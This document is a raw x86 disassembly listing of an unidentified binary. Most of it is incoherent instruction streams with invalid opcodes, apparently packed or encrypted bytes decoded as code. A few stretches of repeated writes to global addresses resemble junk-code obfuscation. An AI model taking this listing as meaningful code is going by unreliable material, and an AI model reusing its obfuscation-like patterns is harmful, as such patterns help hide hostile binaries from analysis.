  408a30:	or     eax,0xed019b90
  408a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a36:	popf   
  408a37:	adc    eax,0x830a7b55
  408a3c:	pop    ds
  408a3d:	test   al,0x14
  408a3f:	xor    BYTE PTR [ebx-0x60],0xba
  408a43:	aas    
  408a44:	push   0xb4e08b5f
  408a49:	lods   eax,DWORD PTR ds:[esi]
  408a4a:	pusha  
  408a4b:	mov    bh,0x2b
  408a4d:	xchg   esi,eax
  408a4e:	ss (bad) 
  408a50:	into   
  408a51:	ror    DWORD PTR [edi-0x2c],0x9e
  408a55:	xor    eax,DWORD PTR [ebx]
  408a57:	add    DWORD PTR [esp+eiz*4-0x1226c844],0xffffff9f
  408a5f:	cli    
  408a60:	mov    ch,0x94
  408a62:	jecxz  0x4089e7
  408a64:	js     0x408a5c
  408a66:	or     al,0x70
  408a68:	cmc    
  408a69:	sub    al,0x2b
  408a6b:	in     al,dx
  408a6c:	in     eax,dx
  408a6d:	pop    esi
  408a6e:	(bad)  
  408a6f:	and    WORD PTR [edi],ax
  408a72:	xchg   esi,eax
  408a73:	sti    
  408a74:	mov    ebp,0xe30ce76d
  408a79:	cmp    eax,0xeff6d017
  408a7e:	js     0x408abc
  408a80:	ror    DWORD PTR [esi+0x14],0x82
  408a84:	ss sub al,0xc4
  408a87:	ret    
  408a88:	mov    WORD PTR [ebx+0x34c52d4d],gs
  408a8e:	leave  
  408a8f:	call   DWORD PTR [ecx+0x54d3c398]
  408a95:	stos   DWORD PTR es:[edi],eax
  408a96:	or     al,0x6a
  408a98:	lods   al,BYTE PTR ds:[esi]
  408a99:	stos   BYTE PTR es:[edi],al
  408a9a:	mov    dl,0x55
  408a9c:	aas    
  408a9d:	mov    ebp,0xf42c559f
  408aa2:	lods   al,BYTE PTR ds:[esi]
  408aa3:	jno    0x408aad
  408aa5:	jmp    0x408a4c
  408aa7:	mov    ds:0x5b036a3e,eax
  408aac:	dec    esi
  408aad:	pop    eax
  408aae:	je     0x408ad0
  408ab0:	test   BYTE PTR [eiz*4+0x868774e],ch
  408ab7:	(bad)  [eax]
  408ab9:	fstp   st(6)
  408abb:	test   bl,dh
  408abd:	bound  edi,QWORD PTR [eax]
  408abf:	daa    
  408ac0:	mov    edx,DWORD PTR [edx]
  408ac2:	mov    ebp,0xaf816ca6
  408ac7:	push   cs
  408ac8:	loop   0x408ab6
  408aca:	out    0xe4,al
  408acc:	push   ebx
  408acd:	mov    bl,0x8d
  408acf:	xchg   esi,eax
  408ad0:	in     eax,dx
  408ad1:	test   BYTE PTR [edx],ch
  408ad3:	mov    ds:0xcd787b2a,al
  408ad8:	cmp    BYTE PTR fs:[edx],al
  408adb:	les    eax,FWORD PTR [edx+0x171236f1]
  408ae1:	xchg   esi,eax
  408ae2:	jnp    0x408ae4
  408ae4:	push   ebx
  408ae5:	xchg   DWORD PTR [eax-0x22],ecx
  408ae8:	test   DWORD PTR ds:0xe468d7ec,edx
  408aee:	add    cl,BYTE PTR [edi]
  408af0:	(bad)  
  408af1:	lahf   
  408af2:	jp     0x408b07
  408af4:	and    al,0x88
  408af6:	loop   0x408b1a
  408af8:	jnp    0x408b4d
  408afa:	dec    esi
  408afb:	jmp    0xa2f3:0x74f66e09
  408b02:	ret    0x817c
  408b05:	in     al,dx
  408b06:	mov    ds:0x46e423a8,eax
  408b0b:	pop    eax
  408b0c:	jp     0x408b69
  408b0e:	xchg   DWORD PTR [ebx-0x3c57b472],esp
  408b14:	pop    ecx
  408b15:	and    al,0x5
  408b17:	clc    
  408b18:	(bad)  
  408b19:	lods   eax,DWORD PTR ds:[esi]
  408b1a:	xchg   edi,eax
  408b1b:	mov    esi,0x82a89d5
  408b20:	rol    DWORD PTR [esi+0x39],1
  408b23:	dec    esi
  408b24:	jbe    0x408b2e
  408b26:	ins    BYTE PTR es:[edi],dx
  408b27:	adc    al,BYTE PTR [ebp+0x5c]
  408b2a:	test   eax,0x69caac8a
  408b2f:	cmp    esp,edx
  408b31:	fwait
  408b32:	dec    eax
  408b33:	push   ebp
  408b34:	pusha  
  408b35:	daa    
  408b36:	outs   dx,BYTE PTR ds:[esi]
  408b37:	adc    eax,0x7d712455
  408b3c:	int3   
  408b3d:	add    al,0x48
  408b3f:	xchg   edi,eax
  408b40:	fmul   DWORD PTR [ebx]
  408b42:	push   cs
  408b43:	and    DWORD PTR [edi-0x3f5ea6c2],ebp
  408b49:	fld    TBYTE PTR [ebp-0x4d]
  408b4c:	stos   DWORD PTR es:[edi],eax
  408b4d:	mov    ebx,0xbef8bcf7
  408b52:	sub    al,0xe2
  408b54:	aad    0x1d
  408b56:	add    BYTE PTR [ebx+ebp*1+0x4815ea0],cl
  408b5d:	push   cx
  408b5f:	in     eax,0xe0
  408b61:	mov    bl,0xf8
  408b63:	pop    esi
  408b64:	mov    edi,DWORD PTR [ecx-0x669f46f6]
  408b6a:	mov    esi,0x72741374
  408b6f:	pop    edi
  408b70:	(bad)  
  408b71:	sti    
  408b72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b73:	mov    ebp,0x37480f0b
  408b78:	and    al,cl
  408b7a:	outs   dx,DWORD PTR ds:[esi]
  408b7b:	xchg   DWORD PTR [eax-0x47468796],edi
  408b81:	pop    ds
  408b82:	imul   edi,DWORD PTR [edi-0x60],0x5
  408b86:	cmp    ah,al
  408b88:	cmp    DWORD PTR [edx-0x5efd1bf1],esp
  408b8e:	xchg   ebx,eax
  408b8f:	sbb    DWORD PTR [ebp-0x8],ebp
  408b92:	push   ds
  408b93:	call   DWORD PTR [edx]
  408b95:	gs ins DWORD PTR es:[edi],dx
  408b97:	xchg   esi,eax
  408b98:	jae    0x408b96
  408b9a:	hlt    
  408b9b:	dec    eax
  408b9c:	fistp  DWORD PTR [edi+0x7dc085e6]
  408ba2:	push   eax
  408ba3:	dec    ebp
  408ba4:	sub    DWORD PTR [edi+0x7d],edi
  408ba7:	jmp    0x79be:0xdfeee683
  408bae:	sub    BYTE PTR [edx-0x3],bh
  408bb1:	es xchg ebp,eax
  408bb3:	sub    al,dh
  408bb5:	iret   
  408bb6:	adc    DWORD PTR [esi],ebx
  408bb8:	push   ebx
  408bb9:	jnp    0x408b71
  408bbb:	(bad)
  408bbf:	ficom  DWORD PTR [edi-0x3d]
  408bc2:	aaa    
  408bc3:	add    al,0x68
  408bc5:	jg     0x408b7b
  408bc7:	inc    ebx
  408bc8:	push   ebx
  408bc9:	and    al,0x97
  408bcb:	sub    dl,BYTE PTR [esp+eax*8+0x7c7a34c5]
  408bd2:	xor    ebp,DWORD PTR [edi]
  408bd4:	lods   eax,DWORD PTR ds:[esi]
  408bd5:	fld    TBYTE PTR [edx+eiz*1-0x7ef642e2]
  408bdc:	cld    
  408bdd:	xor    DWORD PTR [eax+eiz*1],eax
  408be0:	add    BYTE PTR [esi],dh
  408be2:	mov    ebp,0x66bd7852
  408be7:	(bad)  
  408be8:	cmc    
  408be9:	inc    ebx
  408bea:	das    
  408beb:	(bad)  
  408bec:	mov    edi,DWORD PTR [edx]
  408bee:	dec    esi
  408bef:	fwait
  408bf0:	sub    DWORD PTR [esi-0x16327aa4],0xbdc49577
  408bfa:	mov    dh,0xa2
  408bfc:	add    bh,cl
  408bfe:	or     esi,edi
  408c00:	(bad)  
  408c01:	sub    eax,0xbcf406c2
  408c06:	cmp    eax,DWORD PTR ds:0x377b8fad
  408c0c:	scas   al,BYTE PTR es:[edi]
  408c0d:	inc    ebx
  408c0e:	mov    edx,0x7ff05ad5
  408c13:	lods   eax,DWORD PTR ds:[esi]
  408c14:	fld    TBYTE PTR [ebx-0x4f6bb613]
  408c1a:	dec    esp
  408c1b:	pop    eax
  408c1c:	retf   
  408c1d:	inc    ebp
  408c1e:	inc    esi
  408c1f:	inc    ebx
  408c20:	jge    0x408bfe
  408c22:	mov    eax,0x61f62b79
  408c27:	mov    dh,0xb4
  408c29:	cmp    eax,0x452174c1
  408c2e:	(bad)  
  408c2f:	das    
  408c30:	jbe    0x408bd1
  408c32:	in     eax,0x7d
  408c34:	add    ah,ch
  408c36:	mov    dh,0x33
  408c38:	popf   
  408c39:	push   DWORD PTR [eax]
  408c3b:	xchg   ecx,eax
  408c3c:	iret   
  408c3d:	xchg   esi,eax
  408c3e:	mov    dh,0xec
  408c40:	leave  
  408c41:	test   DWORD PTR [edx+0x76],edx
  408c44:	push   eax
  408c45:	dec    ebx
  408c46:	pop    edx
  408c47:	dec    esp
  408c48:	mov    esp,0xb485ea3b
  408c4d:	mov    ecx,0xf92dc25
  408c52:	test   DWORD PTR [ecx+0x0],eax
  408c55:	add    BYTE PTR [eax],al
  408c57:	mov    eax,ds:0x41497e
  408c5c:	mov    eax,DWORD PTR [eax]
  408c5e:	mov    DWORD PTR ds:0x434643,0x3b52
  408c68:	mov    DWORD PTR [ebp-0x14],eax
  408c6b:	mov    eax,ds:0x414b86
  408c70:	mov    DWORD PTR ds:0x434607,0x120a
  408c7a:	mov    eax,DWORD PTR [eax]
  408c7c:	mov    DWORD PTR ds:0x434637,0x2b06
  408c86:	mov    DWORD PTR [ebp-0x18],eax
  408c89:	mov    DWORD PTR ds:0x43456f,0x61a0
  408c93:	jmp    0x4092c1
  408c98:	mov    DWORD PTR ds:0x43467f,0x680c
  408ca2:	cmp    edi,0x33c
  408ca8:	mov    DWORD PTR ds:0x4345f7,0x197
  408cb2:	jne    0x408fac
  408cb8:	jmp    0x408f40
  408cbd:	call   0x641af49f
  408cc2:	je     0x408d41
  408cc4:	fnsave [eax-0x52]
  408cc7:	inc    ecx
  408cc8:	leave  
  408cc9:	in     eax,0x6f
  408ccb:	mov    esi,0x7ee544d1
  408cd0:	jle    0x408cb3
  408cd2:	js     0x408d52
  408cd4:	jle    0x408c99
  408cd6:	mov    eax,ds:0x5c192df7
  408cdb:	enter  0x84bb,0x5b
  408cdf:	mov    BYTE PTR [ecx+esi*2+0x673e39ba],ah
  408ce6:	sbb    ecx,eax
  408ce8:	push   0x42
  408cea:	mov    al,0x8d
  408cec:	push   ecx
  408ced:	call   0xd003:0x4bab381c
  408cf4:	adc    eax,0x1737db3c
  408cf9:	pop    ds
  408cfa:	hlt    
  408cfb:	mov    dh,0x3b
  408cfd:	add    cl,BYTE PTR [esi+eax*2]
  408d00:	aam    0xee
  408d02:	add    al,0x3d
  408d04:	psubsw mm0,QWORD PTR [edi+0x45]
  408d08:	and    bl,BYTE PTR [ebx+0x358bd905]
  408d0e:	or     ah,BYTE PTR [esi+0x20]
  408d11:	ins    BYTE PTR es:[edi],dx
  408d12:	and    edi,DWORD PTR [eax-0x79]
  408d15:	out    dx,al
  408d16:	mov    ch,0x73
  408d18:	ret    0xd1ef
  408d1b:	enter  0x72c2,0xa4
  408d1f:	fisubr DWORD PTR [ecx+ebx*1]
  408d22:	and    eax,0xcf8337ed
  408d27:	(bad)  
  408d29:	or     ch,BYTE PTR [ecx-0x80]
  408d2c:	das    
  408d2d:	mov    ds:0x5908a8ea,al
  408d32:	inc    ebp
  408d33:	ja     0x408cf4
  408d35:	pop    ebx
  408d36:	nop
  408d37:	arpl   WORD PTR [ebp+0x7d7696e],bx
  408d3d:	test   eax,0x8e183787
  408d42:	std    
  408d43:	pushf  
  408d44:	sbb    al,0xd1
  408d46:	test   DWORD PTR [edi-0x5742cc8c],ebx
  408d4c:	inc    edx
  408d4d:	push   0xfb859919
  408d52:	mov    bh,0x44
  408d54:	aam    0x8b
  408d56:	out    0xbd,eax
  408d58:	or     DWORD PTR [esi+0x1f385b4],0xffffffd2
  408d5f:	jl     0x408d6b
  408d61:	ins    DWORD PTR es:[edi],dx
  408d62:	loope  0x408d64
  408d64:	out    0x65,al
  408d66:	mov    edi,0x70f314dd
  408d6b:	adc    al,0xa3
  408d6d:	push   ss
  408d6e:	xchg   BYTE PTR ds:0x6e012b35,bl
  408d74:	in     al,0xa2
  408d76:	out    dx,al
  408d77:	call   FWORD PTR gs:[ecx-0x6]
  408d7b:	test   DWORD PTR [eax-0x539bcc5a],0xddcbecd6
  408d85:	inc    edx
  408d86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d87:	sti    
  408d88:	sbb    BYTE PTR [edx],ch
  408d8a:	addr16 mov eax,ds:0xa95
  408d8e:	enter  0x9830,0xea
  408d92:	jg     0x408db8
  408d94:	jecxz  0x408d31
  408d96:	inc    esp
  408d97:	pop    es
  408d98:	fsub   st,st(5)
  408d9a:	ins    BYTE PTR es:[edi],dx
  408d9b:	xchg   ecx,eax
  408d9c:	xchg   esi,eax
  408d9d:	mov    edx,0x13a81cf1
  408da2:	ins    BYTE PTR es:[edi],dx
  408da3:	mov    al,ds:0x369cffb5
  408da8:	adc    bh,ah
  408daa:	rol    DWORD PTR ds:0x118090d7,cl
  408db0:	jmp    0x312a738c
  408db5:	rcr    DWORD PTR [ebp+esi*4-0x44],0xe4
  408dba:	adc    eax,DWORD PTR [edi+0x6c]
  408dbd:	ins    BYTE PTR es:[edi],dx
  408dbe:	sbb    eax,0x54f36719
  408dc3:	sub    DWORD PTR [esi],ecx
  408dc5:	arpl   WORD PTR [ebx-0x30133787],ax
  408dcb:	ret    0xb08c
  408dce:	inc    ecx
  408dcf:	xlat   BYTE PTR ds:[ebx]
  408dd0:	aaa    
  408dd1:	div    DWORD PTR [ebx+esi*1+0x2e51c09]
  408dd8:	pop    eax
  408dd9:	sbb    BYTE PTR [eax],0xd1
  408ddc:	loope  0x408db6
  408dde:	push   eax
  408ddf:	add    eax,0xf5861b5b
  408de4:	dec    edi
  408de5:	je     0x408e1e
  408de7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408de8:	lods   al,BYTE PTR ds:[esi]
  408de9:	scas   al,BYTE PTR es:[edi]
  408dea:	adc    ebp,DWORD PTR [edx]
  408dec:	mov    ebx,0xf179449d
  408df1:	hlt    
  408df2:	cmp    ebx,eax
  408df4:	rol    bl,0x3c
  408df7:	enter  0x609f,0x52
  408dfb:	cmp    al,0xd4
  408dfd:	mov    ecx,0xd3c495f
  408e02:	neg    BYTE PTR es:[eax+eax*8]
  408e06:	push   cs
  408e07:	enter  0x99e9,0xdb
  408e0b:	lods   al,BYTE PTR ds:[esi]
  408e0c:	inc    ecx
  408e0d:	aas    
  408e0e:	pop    edi
  408e0f:	cmp    al,0xb8
  408e11:	sub    esp,DWORD PTR [ebx]
  408e13:	stos   DWORD PTR es:[edi],eax
  408e14:	fwait
  408e15:	xchg   ebx,eax
  408e16:	adc    ebx,DWORD PTR [edx+esi*8]
  408e19:	(bad)  
  408e1a:	jmp    0x7975:0x52f1d468
  408e21:	cmp    cl,bl
  408e23:	ins    BYTE PTR es:[edi],dx
  408e24:	dec    edx
  408e25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e26:	nop
  408e27:	xchg   esi,eax
  408e28:	mov    edi,0xa6057f50
  408e2d:	xchg   edx,ebp
  408e2f:	inc    ebx
  408e30:	adc    BYTE PTR [edi+edi*8+0x7b],0x19
  408e35:	mov    eax,ds:0xccbba33e
  408e3a:	cld    
  408e3b:	(bad)  
  408e3c:	addr16 pop edi
  408e3e:	clc    
  408e3f:	jnp    0x408dd4
  408e41:	in     al,0x2e
  408e43:	xor    esi,ecx
  408e45:	sbb    al,0xd1
  408e47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e48:	enter  0x3ef8,0xe2
  408e4c:	rcr    BYTE PTR [eax+0x6a],0x30
  408e50:	popf   
  408e51:	fisubr WORD PTR [edx]
  408e53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e54:	nop
  408e55:	push   0x2c79db38
  408e5a:	push   ecx
  408e5b:	sbb    edi,DWORD PTR [esi+0x50]
  408e5e:	push   ebx
  408e5f:	jmp    0x41902165
  408e64:	repz or BYTE PTR ds:0x13f11f0d,0xe0
  408e6c:	pop    es
  408e6d:	dec    ebp
  408e6e:	and    edi,DWORD PTR [ebx]
  408e70:	xchg   ebx,eax
  408e71:	fdiv   DWORD PTR [edx-0x22ad6d83]
  408e77:	or     BYTE PTR [edx-0x27],cl
  408e7a:	sbb    BYTE PTR [ebp-0x39056d32],dh
  408e80:	inc    ebx
  408e81:	cmp    ecx,ecx
  408e83:	cli    
  408e84:	mov    dl,0x3c
  408e86:	adc    BYTE PTR [edi],cl
  408e88:	push   ss
  408e89:	fidiv  DWORD PTR [ecx]
  408e8b:	test   BYTE PTR [ecx],bh
  408e8d:	xchg   ebp,eax
  408e8e:	nop
  408e8f:	cld    
  408e90:	pushf  
  408e91:	icebp  
  408e92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e95:	dec    ebx
  408e96:	je     0x408efc
  408e98:	inc    esi
  408e99:	pop    ss
  408e9a:	outs   dx,DWORD PTR ds:[esi]
  408e9b:	das    
  408e9c:	add    eax,0x85911c03
  408ea1:	pop    ss
  408ea2:	in     eax,0x33
  408ea4:	outs   dx,DWORD PTR ds:[esi]
  408ea5:	lods   eax,DWORD PTR ds:[esi]
  408ea6:	mov    esi,0x482db793
  408eab:	inc    esp
  408eac:	xchg   ecx,eax
  408ead:	mov    ebp,0x1f3d168f
  408eb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eb3:	sub    dl,dl
  408eb5:	inc    esi
  408eb6:	sbb    BYTE PTR [esi+0x7c7923b0],cl
  408ebc:	sbb    ah,BYTE PTR [ebp-0x77]
  408ebf:	or     DWORD PTR [ebx-0x27],edi
  408ec2:	mov    ch,ah
  408ec4:	sub    DWORD PTR [ebp+0x71],eax
  408ec7:	pop    eax
  408ec8:	cs inc ecx
  408eca:	adc    ebp,ebp
  408ecc:	pop    esi
  408ecd:	aaa    
  408ece:	loop   0x408f0a
  408ed0:	outs   dx,DWORD PTR ds:[esi]
  408ed1:	jl     0x408edb
  408ed3:	add    DWORD PTR [ebp+0x44],ecx
  408ed6:	jns    0x408ebe
  408ed8:	jmp    0xbebe2bc2
  408edd:	inc    esi
  408ede:	les    edi,FWORD PTR [ebp+0x29bb76ed]
  408ee4:	xchg   esi,eax
  408ee5:	or     DWORD PTR [eax-0x73],esi
  408ee8:	je     0x408f67
  408eea:	lea    esi,[eax+eax*1]
  408eed:	and    DWORD PTR [ebp*2-0x4212220b],edi
  408ef4:	sahf   
  408ef5:	mov    dh,dl
  408ef7:	lds    edx,FWORD PTR ds:0x6e4b200
  408efd:	jne    0x408eee
  408eff:	js     0x408ea4
  408f01:	mov    esp,0x2fd9bd4d
  408f06:	sub    ecx,DWORD PTR [ebp-0x7d82142b]
  408f0c:	(bad)  
  408f0d:	fucomip st,st(7)
  408f0f:	push   0xb3ff4c99
  408f14:	daa    
  408f15:	and    ch,BYTE PTR [eax-0x6d]
  408f18:	les    ebx,FWORD PTR [esi-0x5aa2a46f]
  408f1e:	jge    0x408f5b
  408f20:	loop   0x408ef1
  408f22:	mov    ebp,0xa27e1bfe
  408f27:	popa   
  408f28:	cmp    al,dh
  408f2a:	fdivr  st(3),st
  408f2c:	imul   edi,DWORD PTR [esi+eax*8+0x7740719a],0xb7630f91
  408f37:	scas   eax,DWORD PTR es:[edi]
  408f38:	jne    0x408ebf
  408f3a:	sbb    BYTE PTR [ebx],ah
  408f3c:	xor    eax,0x833d4531
  408f41:	or     BYTE PTR gs:[eax],al
  408f44:	mov    eax,DWORD PTR [ebp-0x8]
  408f47:	or     DWORD PTR ds:0x434643,0x434603
  408f51:	sub    eax,DWORD PTR [ebp+0x8]
  408f54:	push   eax
  408f55:	mov    eax,ds:0x434683
  408f5a:	or     DWORD PTR ds:0x434643,eax
  408f60:	mov    eax,DWORD PTR [ebp-0x4]
  408f63:	add    DWORD PTR ds:0x43455f,0x4345cf
  408f6d:	add    eax,DWORD PTR [ebp+0x8]
  408f70:	sub    DWORD PTR ds:0x434647,0x4345c7
  408f7a:	push   eax
  408f7b:	dec    DWORD PTR ds:0x43456b
  408f81:	call   0x4092e7
  408f86:	mov    DWORD PTR ds:0x434637,0x29a7
  408f90:	inc    DWORD PTR [ebp+0x8]
  408f93:	cmp    DWORD PTR [ebp+0x8],0x52
  408f97:	mov    DWORD PTR ds:0x43457f,0x7d48
  408fa1:	jb     0x408f44
  408fa7:	jmp    0x4092c1
  408fac:	cmp    edi,0x1a2
  408fb2:	jne    0x40928f
  408fb8:	mov    DWORD PTR [ebp-0x60],0xf89c853a
  408fbf:	mov    eax,DWORD PTR [ebp-0x4]
  408fc2:	mov    DWORD PTR [ebp-0x5c],eax
  408fc5:	mov    eax,DWORD PTR [ebp-0x8]
  408fc8:	mov    DWORD PTR [ebp-0x58],eax
  408fcb:	mov    eax,DWORD PTR [ebp-0xc]
  408fce:	jmp    0x409256
  408fd3:	mov    BYTE PTR [edi],al
  408fd5:	xchg   esi,eax
  408fd6:	jno    0x408f69
  408fd8:	jno    0x409043
  408fda:	out    0xcb,eax
  408fdc:	fisttp DWORD PTR [esi+esi*1-0x13ea4dec]
  408fe3:	das    
  408fe4:	loopne 0x409064
  408fe6:	jle    0x408fc9
  408fe8:	js     0x409068
  408fea:	jle    0x409060
  408fec:	mov    ah,0x61
  408fee:	(bad)  
  408ff0:	jle    0x408f8b
  408ff2:	xor    dh,BYTE PTR [ebx]
  408ff4:	sub    DWORD PTR [ebp+0x1a0695b6],ebp
  408ffa:	(bad)  
  408ffb:	in     eax,0xd0
  408ffd:	or     BYTE PTR [ebx-0x63c007c2],dh
  409003:	ss fs pusha 
  409006:	in     al,0x54
  409008:	jmp    0x66b3:0xee0006a3
  40900f:	or     al,0x8f
  409011:	sub    ecx,DWORD PTR gs:[ecx+0x27]
  409015:	jp     0x409076
  409017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409018:	sbb    DWORD PTR [ebp+0x73],esi
  40901b:	or     al,0x69
  40901d:	loopne 0x40904c
  40901f:	mov    WORD PTR [edx-0x33],fs
  409022:	xor    bh,0x45
  409025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409026:	sbb    ch,dh
  409028:	test   DWORD PTR [ebx-0x25],ecx
  40902b:	sub    esp,DWORD PTR [ecx]
  40902d:	pop    eax
  40902e:	push   cs
  40902f:	out    0xc,eax
  409031:	ds mov dh,0x44
  409034:	mov    dl,0x9
  409036:	popa   
  409037:	pop    esp
  409038:	dec    esp
  409039:	jg     0x408fdb
  40903b:	mov    dh,0x67
  40903d:	jp     0x4090a7
  40903f:	(bad)  
  409041:	fucom  st(7)
  409043:	or     DWORD PTR ds:0x4edac4ca,edx
  409049:	lahf   
  40904a:	lahf   
  40904b:	add    esi,DWORD PTR ds:0x10103ab2
  409051:	cmp    DWORD PTR [esi+0x66],ebp
  409054:	sahf   
  409055:	mov    ebx,DWORD PTR [edi+0x70]
  409058:	in     al,dx
  409059:	mov    edi,0xca2f292a
  40905e:	xchg   ebp,eax
  40905f:	mov    eax,0xf4d9e130
  409064:	mov    cl,al
  409066:	cmp    ah,ah
  409068:	mov    ebp,ecx
  40906a:	aam    0xed
  40906c:	hlt    
  40906d:	fcmovbe st,st(5)
  40906f:	js     0x409087
  409071:	stos   BYTE PTR es:[edi],al
  409072:	ja     0x409009
  409074:	out    0xa2,eax
  409076:	hlt    
  409077:	out    0x9e,al
  409079:	je     0x409064
  40907b:	cmp    al,0x48
  40907d:	shl    BYTE PTR [edi-0x271cc681],cl
  409083:	xchg   esp,eax
  409084:	sti    
  409085:	jp     0x4090f7
  409087:	cmp    edi,esp
  409089:	inc    eax
  40908a:	lods   eax,DWORD PTR ds:[esi]
  40908b:	retf   
  40908c:	inc    ebp
  40908d:	fistp  WORD PTR [ecx-0x116b3d28]
  409093:	pushf  
  409094:	xor    esp,esp
  409096:	fstp   DWORD PTR [edi+0x3]
  409099:	mov    bl,0xf8
  40909b:	add    al,0xe3
  40909d:	sub    BYTE PTR [edx-0x65dd989b],cl
  4090a3:	pop    ecx
  4090a4:	repz jle 0x409054
  4090a7:	arpl   dx,si
  4090a9:	(bad)  
  4090aa:	sub    ecx,DWORD PTR [ecx]
  4090ac:	repnz pop es
  4090ae:	test   al,0xdd
  4090b0:	(bad)  
  4090b1:	cdq    
  4090b2:	inc    esi
  4090b3:	add    ecx,DWORD PTR [edi+0x5a]
  4090b6:	aas    
  4090b7:	inc    ecx
  4090b8:	sbb    BYTE PTR ds:0xc51e240e,ah
  4090be:	xchg   esi,edx
  4090c0:	pop    edx
  4090c1:	cli    
  4090c2:	jmp    0x18aed994
  4090c7:	jbe    0x40908f
  4090c9:	xor    al,0x3a
  4090cb:	(bad)
  4090cf:	jbe    0x409093
  4090d1:	imul   eax,DWORD PTR [esi],0x5f
  4090d4:	neg    BYTE PTR [ebx+0x6947b684]
  4090da:	pop    es
  4090db:	or     eax,0x545127d4
  4090e0:	push   esi
  4090e1:	jg     0x4090c6
  4090e3:	pop    esi
  4090e4:	iret   
  4090e5:	xor    eax,DWORD PTR [ebx-0x4b]
  4090e8:	jo     0x4090cb
  4090ea:	inc    ebx
  4090eb:	xchg   esp,eax
  4090ec:	test   al,0x3f
  4090ee:	xor    al,0xf8
  4090f0:	stc    
  4090f1:	cmp    esp,esp
  4090f3:	xchg   esp,eax
  4090f4:	xchg   ebx,eax
  4090f5:	and    ebx,DWORD PTR [ecx+edi*2]
  4090f8:	sub    DWORD PTR [eax-0x33d41a3e],esi
  4090fe:	out    0x87,eax
  409100:	into   
  409101:	test   BYTE PTR [esi-0x32],ch
  409104:	mov    ebx,0x808ea288
  409109:	setge  cl
  40910c:	stos   BYTE PTR es:[edi],al
  40910d:	sahf   
  40910e:	aad    0x3a
  409110:	pop    ecx
  409111:	fild   WORD PTR [ebx+0x288619bf]
  409117:	repz inc ebx
  409119:	sub    edx,DWORD PTR [edx+0x2cffc0e6]
  40911f:	jmp    0x409153
  409121:	or     esi,DWORD PTR ds:0x8e9f26f0
  409127:	push   esp
  409128:	and    al,0xa
  40912a:	outs   dx,DWORD PTR ds:[esi]
  40912b:	push   es
  40912c:	or     ch,BYTE PTR [edx-0x396c4079]
  409132:	fiadd  DWORD PTR [bx+di+0x2a36]
  409137:	test   ah,cl
  409139:	outs   dx,BYTE PTR ds:[esi]
  40913a:	call   0x324b:0x7bbc8830
  409141:	jmp    0x4091a3
  409143:	addr16 in eax,dx
  409145:	inc    ecx
  409146:	mov    eax,ds:0xbf3e362d
  40914b:	push   ebx
  40914c:	imul   BYTE PTR [esi]
  40914e:	jmp    0x40912a
  409150:	add    ebp,DWORD PTR [esi-0xf7ab65f]
  409156:	sbb    bh,0x3
  409159:	cld    
  40915a:	and    eax,0x3eff3463
  40915f:	pop    es
  409160:	cdq    
  409161:	scas   al,BYTE PTR es:[edi]
  409162:	dec    ecx
  409163:	add    eax,0x63ca8321
  409168:	(bad)  
  409169:	scas   eax,DWORD PTR es:[edi]
  40916a:	fcomi  st,st(6)
  40916c:	adc    eax,0x25eacb90
  409171:	and    ebp,ecx
  409173:	xchg   esp,eax
  409174:	mov    dl,0x13
  409176:	gs pop edx
  409178:	sub    BYTE PTR [ebx],0xa2
  40917b:	xchg   esi,eax
  40917d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40917e:	enter  0x39a3,0xa7
  409182:	int    0xe2
  409184:	mov    al,ds:0x1c79337b
  409189:	xor    BYTE PTR [edx-0x67ae378e],ch
  40918f:	in     al,dx
  409190:	imul   esi,DWORD PTR [esi+esi*4-0x1c1b744d],0xe432d93f
  40919b:	cmp    DWORD PTR [ebp+0x24],ebx
  40919e:	leave  
  40919f:	push   edx
  4091a0:	add    cl,ch
  4091a2:	addr16 sti 
  4091a4:	or     esp,edx
  4091a6:	lock mov ch,0x84
  4091a9:	adc    eax,ecx
  4091ab:	and    eax,DWORD PTR [edi]
  4091ad:	scas   al,BYTE PTR es:[edi]
  4091ae:	push   ds
  4091af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091b0:	add    DWORD PTR [ecx+eiz*2-0x37],ebx
  4091b4:	fdiv   DWORD PTR [edi+0x7c]
  4091b7:	outs   dx,BYTE PTR ds:[esi]
  4091b8:	adc    ch,ah
  4091ba:	mov    ebx,0xc5b6018b
  4091bf:	jmp    0xd2e8c3ee
  4091c4:	in     al,dx
  4091c5:	jg     0x4091c8
  4091c7:	mov    edi,0xd4cf7122
  4091cc:	add    BYTE PTR [ecx+0x67d4dbf4],dl
  4091d2:	xchg   esp,eax
  4091d3:	jmp    0x4091a5
  4091d5:	jb     0x4091b8
  4091d7:	push   ds
  4091d8:	out    0x78,al
  4091da:	adc    al,0x25
  4091dc:	push   ebp
  4091dd:	test   al,0xdc
  4091df:	outs   dx,DWORD PTR ds:[esi]
  4091e0:	dec    eax
  4091e1:	mov    esi,?
  4091e3:	sub    DWORD PTR [edi-0x4],0xfb0d7505
  4091ea:	pop    cx
  4091ec:	mov    dl,0x27
  4091ee:	fiadd  WORD PTR ds:0xd0c75131
  4091f4:	pop    ebx
  4091f5:	(bad)  
  4091f6:	xchg   esi,eax
  4091f7:	mov    ch,al
  4091f9:	jb     0x40923b
  4091fb:	sub    bl,BYTE PTR [ecx-0x52c19ac2]
  409201:	lahf   
  409202:	loop   0x4091f3
  409204:	ror    BYTE PTR [edi-0xb],0x39
  409208:	mov    ds:0xa2edf988,al
  40920d:	shl    DWORD PTR ds:0x37a1611,cl
  409213:	jnp    0x4091b6
  409215:	xchg   ebp,eax
  409216:	sbb    esi,DWORD PTR [edi-0x1]
  409219:	fisub  WORD PTR ds:0x3edc4489
  40921f:	call   DWORD PTR ds:0x96dd86c1
  409225:	dec    edi
